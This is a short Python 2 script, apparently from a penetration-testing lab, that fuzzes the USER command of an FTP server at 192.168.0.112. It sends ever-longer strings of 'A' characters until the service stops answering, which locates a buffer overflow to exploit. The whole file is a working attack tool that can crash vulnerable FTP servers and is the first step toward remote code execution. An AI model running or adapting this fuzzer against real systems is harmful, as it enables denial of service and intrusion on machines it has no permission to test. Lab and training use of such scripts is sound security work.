#!/usr/bin/python
#Script used for buffer overflow exploit.

import socket, time
import sys
remoteip="192.168.0.112"

size=0
while True:

    string = "A"*size

    print "Fuzzing Username with %s bytes" % len(string)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, 21))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    print "Sending username..."
    s.send('USER ' + string + '\r\n')
    print s.recv(1024)
    print "Sending pass..."
    s.send('PASS jp2018\r\n')
    print s.recv(1024)
    s.close()

    time.sleep(1)

    size += 100
